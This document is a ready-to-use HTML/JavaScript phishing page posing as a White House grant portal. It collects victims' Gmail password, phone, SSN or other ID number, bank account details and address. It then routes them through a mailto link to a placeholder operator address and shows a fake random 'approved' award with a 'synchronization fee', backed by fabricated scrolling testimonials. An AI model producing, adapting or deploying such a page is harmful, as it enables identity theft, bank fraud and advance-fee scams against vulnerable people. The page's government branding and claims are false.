<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Federal Allocation Portal | 2026 Executive Branch</title>
    <style>
        :root { --navy: #002344; --gold: #a68d5d; --bg: #f2f2f2; }
        body { font-family: 'Times New Roman', serif; background: var(--bg); margin: 0; color: #333; overflow-x: hidden; }
        .gov-top { background: #000; color: #fff; font-size: 11px; padding: 5px; text-align: center; text-transform: uppercase; }
        .main-header { background: var(--navy); color: white; padding: 25px; text-align: center; border-bottom: 5px solid var(--gold); }
        .main-header img { width: 80px; }
        .container { max-width: 600px; margin: 20px auto; background: white; padding: 30px; border-radius: 2px; box-shadow: 0 10px 40px rgba(0,0,0,0.2); }
        .page { display: none; }
        .active { display: block; }
        h2 { color: var(--navy); border-bottom: 1px solid #ccc; padding-bottom: 10px; }
        label { display: block; margin: 15px 0 5px; font-weight: bold; font-size: 13px; text-transform: uppercase; }
        input, select, textarea { width: 100%; padding: 12px; border: 1px solid #aaa; font-size: 16px; box-sizing: border-box; }
        button { width: 100%; padding: 18px; background: var(--navy); color: white; border: none; font-weight: bold; cursor: pointer; margin-top: 20px; text-transform: uppercase; }
        .verify-box { background: #f9f9f9; border: 2px dashed var(--navy); padding: 20px; text-align: center; margin: 15px 0; }
        .access-code { font-size: 35px; font-weight: bold; color: var(--navy); letter-spacing: 10px; }
        #modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); z-index: 1000; justify-content: center; align-items: center; }
        .modal-inner { background: white; padding: 30px; max-width: 400px; text-align: center; border-top: 8px solid var(--gold); }
        .loader { border: 5px solid #f3f3f3; border-top: 5px solid var(--navy); border-radius: 50%; width: 50px; height: 50px; animation: spin 2s linear infinite; margin: 20px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .testi-scroll { background: #eee; padding: 15px; height: 100px; overflow-y: hidden; margin-top: 20px; font-size: 13px; border-radius: 5px; }
    </style>
</head>
<body>

<div class="gov-top">Official Executive Communication - Restricted Access</div>
<div class="main-header">
    <img src="https://upload.wikimedia.org/wikipedia/commons/3/36/Seal_of_the_President_of_the_United_States.svg" alt="Seal">
    <h1>THE WHITE HOUSE</h1>
</div>

<div class="container">
    <div id="p1" class="page active">
        <h2>Secure Gateway Registration</h2>
        <label>Gmail Address</label>
        <input type="email" id="email" placeholder="example@gmail.com" oninput="validateGmail(this)">
        <label>Primary Mobile Number</label>
        <input type="tel" id="phone" placeholder="+1...">
        <label>Create Secure Password</label>
        <input type="password" id="pw" placeholder="••••••••">
        <button onclick="checkSignup()">Register Device</button>
    </div>

    <div id="p2" class="page">
        <h2>MFA Verification</h2>
        <div class="verify-box"><div class="access-code" id="displayCode"></div></div>
        <input type="text" id="inputCode" placeholder="Enter Code">
        <button onclick="checkCode()">Verify Access</button>
    </div>

    <div id="p3" class="page">
        <h2>Grant Assessment</h2>
        <label>Filing Category</label>
        <select id="userType" onchange="toggleReason()">
            <option value="individual">Personal / Individual</option>
            <option value="organization">Organization / Business</option>
        </select>
        
        <label>Marital Status</label>
        <select><option>Single</option><option>Married</option><option>Divorced</option></select>

        <label>Do you have dependents (Kids)?</label>
        <select><option>No</option><option>1-2 Kids</option><option>3+ Kids</option></select>

        <label>Purpose of Funds</label>
        <select id="reason">
            </select>

        <label>Government ID Number (SSN/EIN/DL)</label>
        <input type="text" id="idNum" placeholder="Verify Identity">

        <button onclick="toPage(4)">Next Step</button>
    </div>

    <div id="p4" class="page">
        <h2>Disbursement Profile</h2>
        <label>Account Holder Name</label>
        <input type="text" id="accName">
        <label>Bank Name</label>
        <input type="text" id="bankName">
        <label>Account Number</label>
        <input type="text" id="accNum">
        <label>Full Physical Address</label>
        <textarea id="address"></textarea>
        <button onclick="calculateAndShowModal()">Finalize Claim</button>
    </div>

    <div id="p5" class="page text-center">
        <h2>Analyzing Federal Records...</h2>
        <p>Cross-referencing Tax ID with Regional Allotment Funds.</p>
        <div class="loader"></div>
        <p>Estimated wait: 10-15 seconds.</p>
    </div>

    <div id="p6" class="page text-center">
        <h1 style="color:var(--navy);">APPROVED ✅</h1>
        <div style="font-size: 40px; color: #1a5e20; font-weight: bold; margin: 15px 0;" id="finalDisplay"></div>
        <p>A synchronization fee of <strong id="feeDisplay"></strong> is required for this award.</p>
        
        <div class="testi-scroll" id="liveTesti"></div>

        <h3>Submit Your Testimony</h3>
        <textarea id="userComment" placeholder="Write your experience here..."></textarea>
        <button onclick="submitTestimony()">Post Testimony</button>
    </div>
</div>

<div id="modal">
    <div class="modal-inner">
        <h3>Official Submission</h3>
        <p id="modalMsg"></p>
        <p style="font-size: 12px; color: red;">Clicking "SUBMIT" will open your email. You MUST click 'SEND' to finish.</p>
        <button onclick="sendManualEmail()">I AGREE & SUBMIT</button>
    </div>
</div>

<script>
    let accessCode;
    let myAmount;
    let myFee;

    // Device Memory
    if(localStorage.getItem('registered')) {
        alert("Device recognized. Logging into active session...");
    }

    function validateGmail(input) {
        if(!input.value.endsWith("@gmail.com")) {
            input.style.borderColor = "red";
        } else {
            input.style.borderColor = "green";
        }
    }

    function checkSignup() {
        const email = document.getElementById('email').value;
        if(!email.endsWith("@gmail.com")) return alert("Only @gmail.com accepted.");
        localStorage.setItem('registered', 'true');
        toPage(2, true);
    }

    function toPage(n, gen=false) {
        if(gen) {
            accessCode = Math.floor(100000 + Math.random() * 900000);
            document.getElementById('displayCode').innerText = accessCode;
        }
        document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
        document.getElementById('p'+n).classList.add('active');
        if(n===3) toggleReason();
    }

    function checkCode() {
        if(document.getElementById('inputCode').value == accessCode) toPage(3);
        else alert("Code Error.");
    }

    function toggleReason() {
        const type = document.getElementById('userType').value;
        const select = document.getElementById('reason');
        const opts = type === 'individual' 
            ? ['School Fees', 'Feeding & Relief', 'House Rent', 'Medical Bills', 'Personal Growth']
            : ['Set up New Business', 'Run Small Business', 'Factory Expansion', 'Agriculture', 'Equipment Purchase'];
        select.innerHTML = opts.map(o => `<option>${o}</option>`).join('');
    }

    function calculateAndShowModal() {
        let min = 127540; let max = 987375;
        myAmount = Math.floor(Math.random() * (max - min + 1)) + min;
        myFee = Math.floor((myAmount / max) * (850 - 420) + 420);
        
        const fmt = new Intl.NumberFormat('en-US', { style: 'currency', currency: 'USD' }).format(myAmount);
        document.getElementById('modalMsg').innerText = `Your calculated allocation is ${fmt}. A refundable fee of $${myFee} applies.`;
        document.getElementById('modal').style.display = 'flex';
    }

    function sendManualEmail() {
        const emailBody = `OFFICIAL GRANT APPLICATION 2026%0D%0A--------------------------%0D%0AName: ${document.getElementById('accName').value}%0D%0AEmail: ${document.getElementById('email').value}%0D%0ABank: ${document.getElementById('bankName').value}%0D%0AAccount: ${document.getElementById('accNum').value}%0D%0AID: ${document.getElementById('idNum').value}%0D%0AAmount: $${myAmount}%0D%0AFee: $${myFee}%0D%0AAddress: ${document.getElementById('address').value}`;
        
        window.location.href = `mailto:YOUR_EMAIL_HERE@gmail.com?subject=GRANT_CLAIM_${document.getElementById('accName').value}&body=${emailBody}`;
        
        document.getElementById('modal').style.display = 'none';
        toPage(5);
        
        setTimeout(() => {
            document.getElementById('finalDisplay').innerText = new Intl.NumberFormat('en-US', { style: 'currency', currency: 'USD' }).format(myAmount);
            document.getElementById('feeDisplay').innerText = `$${myFee}.00`;
            toPage(6);
            startTestimonials();
        }, 15000);
    }

    const names = ["James W.", "Sarah M.", "Linda K.", "Robert T.", "Maria G.", "David O."];
    const msgs = ["Just received my $150k! Thank God.", "I paid the fee and got the credit in 2 hours.", "Factory expansion starting now. Thanks White House!", "Legit! My $420 fee was added back to my $300k payout."];
    
    function startTestimonials() {
        const box = document.getElementById('liveTesti');
        setInterval(() => {
            const n = names[Math.floor(Math.random()*names.length)];
            const m = msgs[Math.floor(Math.random()*msgs.length)];
            const amt = "$"+(Math.floor(Math.random()*500)+127)+",000.00";
            box.innerHTML = `<div style="border-bottom:1px solid #ccc; padding:5px;"><strong>${n}</strong> approved for ${amt}: "${m}"</div>` + box.innerHTML;
        }, 4000);
    }

    function submitTestimony() {
        const comm = document.getElementById('userComment').value;
        if(!comm) return;
        const box = document.getElementById('liveTesti');
        box.innerHTML = `<div style="background:#fff7d1; padding:5px; border-radius:5px;"><strong>YOU:</strong> "${comm}"</div>` + box.innerHTML;
        alert("Testimony posted for review!");
    }
</script>
</body>
</html>
